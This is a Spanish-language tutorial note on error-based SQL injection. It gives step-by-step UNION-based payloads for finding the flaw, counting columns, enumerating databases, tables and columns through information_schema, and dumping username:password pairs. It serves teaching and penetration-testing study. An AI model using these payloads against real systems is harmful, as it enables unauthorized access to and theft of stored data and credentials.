# Error-Based SQL Injection

***

* Tags: #OWASP\_TOP\_10 #vulnerabilidad #hacking #sql #exploiting

***

## Definición

> La **Inyección de SQL basada en errores** es una táctica de ciberataque que explota vulnerabilidades en aplicaciones web al introducir código SQL malicioso a través de entradas no validadas. Esta técnica se aprovecha de las respuestas de error generadas por la base de datos para revelar información sobre la estructura y contenido de la base de datos. Los atacantes utilizan esta información para manipular las consultas y acceder a datos confidenciales, modificar registros o incluso tomar el control del sistema. En caso de no ser capaces de visualizar las respuestas de error, emplearemos \[\[Non-Error-Based SQL Injection]]

## Pasos

### Detectar si es vulnerable

Podemos detectar si una página es vulnerable a este tipo de \[\[SQL Injection]] de diferentes maneras. Una de ellas consiste en añadir una comilla simple en la solicitud, y si nos devuelve algún tipo de error avisando de que la sintaxis de la query introducida es incorrecta, posiblemente sea vulnerable.

```
select column from table where id='$id';    #Si introducimos como id 1' <query a realizar> -- - se cierran las comillas con la introducida y 
								#Podemos ejecutar la query deseada, seguido de un comentario (-- -) para no dar error con la comilla suelta
```

Puede darse el caso, en el que no haga falta el uso de comillas ya que la solicitud que se esté enviando no esté bien programada, como ejemplo podemos ver la siguiente query:

```
select column from table where id=$id;     #Si introducimos como id 1 <query a realizar> se ejecutaría la query deseada
```

Además de estos casos puede ser que tengas que introducir un paréntesis o cualquier otro carácter.

### Deducir el número de columnas existentes en la tabla actual

Nuestra idea como atacantes siempre que comencemos con un ataque de **SQL**, es determinar cuantas columnas hay en la tabla actual. Lo podemos conseguir intentando realizar un ordenamiento de columnas, de manera que podemos ir probando hasta encontrar dicho número. Si empezamos ordenando la tabla por un número grande con el que nos de error, podemos ir bajando hasta encontrar el número exacto de columnas. Se vería algo así:

```
1' order by 50-- -        #ERROR
1' order by 49-- -        #ERROR
1' order by 48-- -        #No ERROR, hay 48 columnas en la tabla actual
```

Podemos tratar de añadir nuevas filas, para tratar de conseguir el número de columnas existentes de la siguiente manera:

```
1' UNION SELECT null-- - No funciona
1' UNION SELECT null,null-- - No funciona
1' UNION SELECT null,null,null-- - Funciona => Hay 3 columnas
```

### Añadir nuevas filas con nuevos datos

Podemos intentar añadir nuevas filas con los datos que queramos, para intentar visualizarla como salida de la query de la siguiente manera:

```
1' union select NULL,NULL,NULL-- -    #En este caso hemos supuesto que hay 3 columnas, si hubiera más o menos habría que cambiarlo
1' union select 1,2,3-- -    
```

Puede darse el caso de que no se visualicen los datos que acabamos de introducir, y puede ser porque el valor que hemos introducido exista (pe si estamos introduciendo ids, seguramente el 1 exista), así que trataremos de introducir uno que no exista para poder visualizar lo que hemos añadido (con el mismo ejemplo de ids, difícilmente exista el 124125123123).

Si hemos llegado hasta aquí pudiendo visualizar lo que hemos introducido, la cosa se puede tensar, porque si en vez de introducir valores que no nos interesan, pedimos el nombre de la base de datos, las bases de datos existentes u otro campo al que no deberíamos tener acceso, accederíamos a información no autorizada.

### Listar bases de datos existentes

Para conocer el nombre de la base de datos en la que nos encontramos actualmente, podemos ejecutar el siguiente comando:

```
124125123123' union select database()-- -
```

Para listar el nombre de todas las bases de datos existentes en el sistema, podemos ejecutar el siguiente comando:

```
123123' union select group_concat(schema_name) from information_schema.schemata-- -
```

Podemos hacerlo en vez de concatenando el nombre de las bases de datos, listando de una a una:

```
123123' union select schema_name from information_schema.schemata limit 0,1-- -
123123' union select schema_name from information_schema.schemata limit 1,1-- -
123123' union select schema_name from information_schema.schemata limit 2,1-- -
...
```

### Listar las tablas de una base de datos existente

```
123123' union select group_concat(table_name) from information_schema.tables where table_schema='<DATABASE_NAME>'-- -
```

Al igual que para listar las bases de datos, podemos utilizar la opción de limit para ir listando de una en una las tablas existentes.

### Listar las columnas de una tabla de una base de datos existente

```
123123' union select group_concat(column_name) from information_schema.columns where table_schema='<DATABASE_NAME>' and table_name='<TABLE_NAME>'-- -
```

Al igual que para listar las bases de datos, podemos utilizar la opción de limit para ir listando de una en una las columnas existentes.

### Listar el contenido de las columnas de una tabla de una base de datos existente

Para listar el contenido de una columna con nombre _COLUMN\_NAME_ para la tabla _TABLE\_NAME_ de la **base de datos actual**, podemos hacer uso del siguiente comando:

```
123123' union select group_concat(<COLUMN_NAME>) from <TABLE_NAME>-- -
```

Si quisiéramos listar el contenido de una columna de una tabla de una base de datos que **no es en la que nos encontramos actualmente**, podemos ejecutar lo siguiente:

```
123123' union select group_concat(<COLUMN_NAME>) from <DATABASE_NAME>.<TABLE_NAME>-- -
```

Si quisiéramos ver el contenido de **dos columnas** (por ejemplo de username y password) separado por dos puntos, podemos hacer uso de la concatenación para ejecutar el siguiente comando:

```
123123' union select group_concat(<COLUMN_NAME1>,':',<COLUMN_NAME2>) from <DATABASE_NAME>.<TABLE_NAME>-- -

#Puede ser que no funcione por las comillas añadidas, así que introducimos los dos puntos en hexadecimal
123123' union select group_concat(<COLUMN_NAME1>,0x3a,<COLUMN_NAME2>) from <DATABASE_NAME>.<TABLE_NAME>-- -
```
